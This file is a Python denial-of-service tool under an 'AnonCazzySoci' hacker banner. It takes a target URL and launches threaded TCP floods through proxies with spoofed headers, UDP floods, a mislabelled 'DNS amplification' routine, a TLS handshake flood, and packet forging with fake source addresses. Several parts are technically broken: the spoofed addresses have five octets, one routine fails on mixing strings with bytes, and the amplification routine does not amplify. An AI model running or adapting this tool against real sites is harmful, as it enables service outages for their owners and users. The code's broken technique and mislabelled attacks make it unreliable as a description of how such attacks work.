import socket
import struct
import concurrent.futures
import random
import threading
import time
import urllib.parse
import requests
from scapy.all import *
import socks

credit = """
\033[1;36m
▄▄▄       ███▄    █  ▒█████   ███▄    █  ▄████▄   ▄▄▄      ▒███████▒▒███████▒▓██   ██▓  ██████  ▒█████   ▄████▄   ██▓
▒████▄     ██ ▀█   █ ▒██▒  ██▒ ██ ▀█   █ ▒██▀ ▀█  ▒████▄    ▒ ▒ ▒ ▄▀░▒ ▒ ▒ ▄▀░ ▒██  ██▒▒██    ▒ ▒██▒  ██▒▒██▀ ▀█  ▓██▒
▒██  ▀█▄  ▓██  ▀█ ██▒▒██░  ██▒▓██  ▀█ ██▒▒▓█    ▄ ▒██  ▀█▄  ░ ▒ ▄▀▒░ ░ ▒ ▄▀▒░   ▒██ ██░░ ▓██▄   ▒██░  ██▒▒▓█    ▄ ▒██▒
░██▄▄▄▄██ ▓██▒  ▐▌██▒▒██   ██░▓██▒  ▐▌██▒▒▓▓▄ ▄██▒░██▄▄▄▄██   ▄▀▒   ░  ▄▀▒   ░  ░ ▐██▓░  ▒   ██▒▒██   ██░▒▓▓▄ ▄██▒░██░
▓█   ▓██▒▒██░   ▓██░░ ████▓▒░▒██░   ▓██░▒ ▓███▀ ░ ▓█   ▓██▒▒███████▒▒███████▒  ░ ██▒▓░▒██████▒▒░ ████▓▒░▒ ▓███▀ ░░██░
▒▒   ▓▒█░░ ▒░   ▒ ▒ ░ ▒░▒░▒░ ░ ▒░   ▒ ▒ ░ ░▒ ▒  ░ ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▒▒ ▓░▒░▒   ██▒▒▒ ▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░ ░▒ ▒  ░░▓ 
  ▒   ▒▒ ░░ ░░   ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░  ░  ▒     ▒   ▒▒ ░░░▒ ▒ ░ ▒░░▒ ▒ ░ ▒ ▓██ ░▒░ ░ ░▒  ░ ░  ░ ▒ ▒░   ░  ▒    ▒ ░
  ░   ▒      ░   ░ ░ ░ ░ ░ ▒     ░   ░ ░ ░          ░   ▒   ░ ░ ░ ░ ░░ ░ ░ ░ ░ ▒ ▒ ░░  ░  ░  ░  ░ ░ ░ ▒  ░         ▒ ░
      ░  ░         ░     ░ ░           ░ ░ ░            ░  ░  ░ ░      ░ ░     ░ ░           ░      ░ ░  ░ ░       ░ 
                                         ░                  ░        ░         ░ ░                       ░           
╔════════════════════════╗
║ Created by: CazzySoci  ║
║                        ║
║      𝓦𝓔𝓛𝓒𝓞𝓜𝓔           ║
║                        ║
║  We Are AnonCazzySoci  ║
║    •We don't die       ║
║    •We Multiply        ║
║    •Expect us!         ║
╚════════════════════════╝
\033[1;36m
"""
print(credit)
url = input("Enter the target website URL: ")
parsed_url = urllib.parse.urlparse(url)
target_ip = socket.gethostbyname(parsed_url.netloc)
target_port = 80
fake_ip = '66.118.234.34:22'

if parsed_url.scheme == 'https':
    target_port = 443

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.83 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_1 likeMac OS X) AppleWebKit/133.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/133.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0;+http://www.baidu.com/search/spider.html£©",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 3 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
    "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/369.36 (KHTML, like Gecko) Mobile Safari/584.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 likeMac OS X) AppleWebKit/275.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/123.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider/7.0;+http://www.baidu.com/search/spider.html£©",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 6 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
    "Mozilla/5.0 (compatible; bingbot/3.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/147.36 (KHTML, like Gecko) Mobile Safari/480.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 15_1 likeMac OS X) AppleWebKit/597.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/599.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Baiduspider/9.0;+http://www.baidu.com/search/spider.html£©",
    "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 8 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
    "Mozilla/5.0 (compatible; bingbot/4.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/254.36 (KHTML, like Gecko) Mobile Safari/225.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 likeMac OS X) AppleWebKit/259.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/296.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 5 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/304.36 (KHTML, like Gecko) Mobile Safari/487.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 likeMac OS X) AppleWebKit/488.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/528.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 1 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/8.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 6_1 likeMac OS X) AppleWebKit/259.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/296.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 5 5 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/6.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/304.36 (KHTML, like Gecko) Mobile Safari/487.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 7_1 likeMac OS X) AppleWebKit/488.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143Safari/528.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)",
     "Mozilla/5.0 (compatible; Baiduspider/5.0;+http://www.baidu.com/search/spider.html£©",
     "AdsBot-Google-Mobile (+http://www.google.com/mobile/adsbot.html) Mozilla (iPhone; U; CPU iPhone OS 1 1 like Mac OS X) AppleWebKit (KHTML, like Gecko) Mobile Safari",
     "Mozilla/5.0 (compatible; bingbot/8.0; +http://www.bing.com/bingbot.htm)",
     "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/406.36 (KHTML, like Gecko) Mobile Safari/553.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)",

]

source_ips = [
    '.'.join(str(random.randint(1, 255)) for _ in range(4)) + '.' + str(random.randint(1, 255))
    for _ in range(2000000)  # Increase this number to generate more IP addresses
]

proxies = []
with open('cazzy.txt', 'r') as file:
    proxies = file.read().splitlines()

def ddos_tcp():
    while True:
        try:
            proxy_address = random.choice(proxies)
            
            sock = socks.socksocket()
            sock.set_proxy(socks.SOCKS5, proxy_address.split(':')[0], int(proxy_address.split(':')[1]))
            
            sock.connect((target_ip, target_port))

            payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(131072, 262144)))
            source_ip = random.choice(source_ips)
            user_agent = random.choice(user_agents)

            request = f"GET {parsed_url.path}?{parsed_url.query} HTTP/1.1\r\nHost: {parsed_url.netloc}\r\nUser-Agent: {user_agent}\r\nX-Forwarded-For: {source_ip}\r\n\r\n"

            sock.sendall(request.encode())

            print("Attacking", url, "on port", target_port, "from", source_ip, "using TCP with proxy", proxy_address)
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

def ddos_udp():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

            payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(131072, 262144)))
            source_ip = random.choice(source_ips)
            user_agent = random.choice(user_agents)

            sock.sendto(bytes(payload, "utf-8"), (target_ip, target_port))

            print("Attacking", url, "on port", target_port, "from", source_ip, "using UDP")
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

def dns_amplification_attack():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            query = f"ANY {parsed_url.netloc}.\r\n"

            sock.sendto(bytes(query, "utf-8"), (target_ip, 53))

            print("Performing DNS Amplification Attack on", url)
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

def ssl_tls_flood():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target_ip, target_port))

            payload = ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()') for _ in range(65535))

            tls_handshake = "\x16\x03\x01" + struct.pack(">H", len(payload) + 4) + payload
            sock.sendall(tls_handshake.encode())

            print("Performing SSL/TLS Flood Attack on", url)
            time.sleep(random.uniform(0.0001, 0.001))
        except:
            pass

def create_botnet(num_bots):
    with concurrent.futures.ThreadPoolExecutor() as executor:
        for _ in range(num_bots):
            executor.submit(ddos_tcp)
            executor.submit(ddos_udp)
            executor.submit(dns_amplification_attack)
            executor.submit(ssl_tls_flood)

def spoof_ip(packet):
    packet[IP].src = random.choice(source_ips)
    packet[IP].dst = target_ip
    del packet[IP].chksum
    del packet[TCP].chksum
    send(packet, verbose=0)

def start_packet_sniffing():
    sniff(filter=f"tcp and dst port {target_port}", prn=spoof_ip)

num_bots = int(input("Enter the number of bots to create: "))
create_botnet(num_bots)
start_packet_sniffing()
